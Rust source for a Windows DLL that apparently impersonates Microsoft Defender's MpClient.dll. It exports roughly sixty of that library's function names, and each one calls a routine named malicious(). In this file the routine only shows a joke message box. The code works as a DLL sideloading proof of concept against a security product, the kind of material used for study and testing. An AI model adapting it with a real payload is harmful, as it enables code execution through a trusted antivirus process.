

use windows::{
    core::PCSTR,
    Win32::{
        UI::WindowsAndMessaging::{
            MessageBoxA,
            MESSAGEBOX_STYLE
        },
        Foundation::{
            BOOL,
            HANDLE,
            HWND,
        }
    }
};

#[no_mangle]
extern "C" fn MpManagerStatusQuery() { malicious(); }
#[no_mangle]
extern "C" fn MpGetTPStateInfo() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigGetValue() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigSetValue() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigClose() { malicious(); }
#[no_mangle]
extern "C" fn MpClientUtilExportFunctions() { malicious(); }
#[no_mangle]
extern "C" fn MpGetTSModeInfo() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigInitialize() { malicious(); }
#[no_mangle]
extern "C" fn MpManagerEnable() { malicious(); }
#[no_mangle]
extern "C" fn MpWDEnable() { malicious(); }
#[no_mangle]
extern "C" fn MpUpdatePlatform() { malicious(); }
#[no_mangle]
extern "C" fn MpRollbackPlatform() { malicious(); }
#[no_mangle]
extern "C" fn MpUnblockPlatform() { malicious(); }
#[no_mangle]
extern "C" fn MpUnblockEngine() { malicious(); }
#[no_mangle]
extern "C" fn MpUnblockSignatures() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigUninitialize() { malicious(); }
#[no_mangle]
extern "C" fn MpThreatOpen() { malicious(); }
#[no_mangle]
extern "C" fn MpThreatEnumerate() { malicious(); }
#[no_mangle]
extern "C" fn MpScanResult() { malicious(); }
#[no_mangle]
extern "C" fn MpScanControl() { malicious(); }
#[no_mangle]
extern "C" fn MpScanStartEx() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigGetValueAlloc() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigOpen() { malicious(); }
#[no_mangle]
extern "C" fn MpFreeMemory() { malicious(); }
#[no_mangle]
extern "C" fn MpUpdateStartEx() { malicious(); }
#[no_mangle]
extern "C" fn MpHandleClose() { malicious(); }
#[no_mangle]
extern "C" fn MpAddDynamicSignatureFile() { malicious(); }
#[no_mangle]
extern "C" fn MpRemoveDynamicSignatureFile() { malicious(); }
#[no_mangle]
extern "C" fn MpDynamicSignatureOpen() { malicious(); }
#[no_mangle]
extern "C" fn MpDynamicSignatureEnumerate() { malicious(); }
#[no_mangle]
extern "C" fn MpGetTaskSchedulerStrings() { malicious(); }
#[no_mangle]
extern "C" fn MpGetTDTFeatureStatusEx() { malicious(); }
#[no_mangle]
extern "C" fn MpGetTDTFeatureStatus() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigIteratorOpen() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigIteratorEnum() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigIteratorClose() { malicious(); }
#[no_mangle]
extern "C" fn MpNetworkCapture() { malicious(); }
#[no_mangle]
extern "C" fn MpConfigDelValue() { malicious(); }
#[no_mangle]
extern "C" fn MpQuarantineRequest() { malicious(); }
#[no_mangle]
extern "C" fn MpManagerStatusQueryEx() { malicious(); }
#[no_mangle]
extern "C" fn MpUpdateStart() { malicious(); }
#[no_mangle]
extern "C" fn MpSampleQuery() { malicious(); }
#[no_mangle]
extern "C" fn MpSampleSubmit() { malicious(); }
#[no_mangle]
extern "C" fn MpConveySampleSubmissionResult() { malicious(); }
#[no_mangle]
extern "C" fn MpGetSampleChunk() { malicious(); }
#[no_mangle]
extern "C" fn MpQueryEngineConfigDword() { malicious(); }
#[no_mangle]
extern "C" fn MpGetDeviceControlSecurityPolicies() { malicious(); }
#[no_mangle]
extern "C" fn MpSetTPState() { malicious(); }
#[no_mangle]
extern "C" fn MpManagerVersionQuery() { malicious(); }
#[no_mangle]
extern "C" fn MpAllocMemory() { malicious(); }
#[no_mangle]
extern "C" fn MpManagerOpen() { malicious(); }
#[no_mangle]
extern "C" fn MpUtilsExportFunctions() { malicious(); }
#[no_mangle]
extern "C" fn MpCleanStart() { malicious(); }
#[no_mangle]
extern "C" fn MpCleanOpen() { malicious(); }

#[no_mangle]
extern "C" fn MpTelemetrySetDWORD() { malicious(); }

 #[no_mangle]
extern "C" fn MpTelemetryUpload() { malicious(); }
 #[no_mangle]
extern "C" fn MpTelemetryUninitialize() { malicious(); }
 #[no_mangle]
extern "C" fn MpTelemetryInitialize() { malicious(); }
 #[no_mangle]
extern "C" fn MpTelemetrySetString() { malicious(); }
 #[no_mangle]
extern "C" fn MpTelemetrySetIfMaxDWORD() { malicious(); }
 #[no_mangle]
extern "C" fn MpTelemetryAddToAverageDWORD() { malicious(); }
 #[no_mangle]
extern "C" fn MpScanStart() { malicious(); }

#[no_mangle]
extern "C" fn malicious() {
    unsafe{
        MessageBoxA(HWND(std::ptr::null_mut()), PCSTR("Good afternoon This is the nigerian virus , due to lack of resources we can't create one to harm your pc kindly please delete one of your important files\x00\x00".as_ptr()), PCSTR("Scary Title\x00".as_ptr()),MESSAGEBOX_STYLE(0));
    }
}

#[no_mangle] // do not mess up the function names as those will be called from dll
#[allow(non_snake_case,unused_variables)]
// This is called in these cases:
/*
1. DLL is loaded into the memory
2. New thread is created  -> Dll call
3. Dllmalicious() called
4. Detach

1. malicious -> call [x]
 */
// entry point
extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    lpv_reserved: &u32, // Now it's a LPVOID a pointer so we need to have a reference
) -> BOOL {
    match call_reason {
        _ => {
            return BOOL(1);
        }
    }
}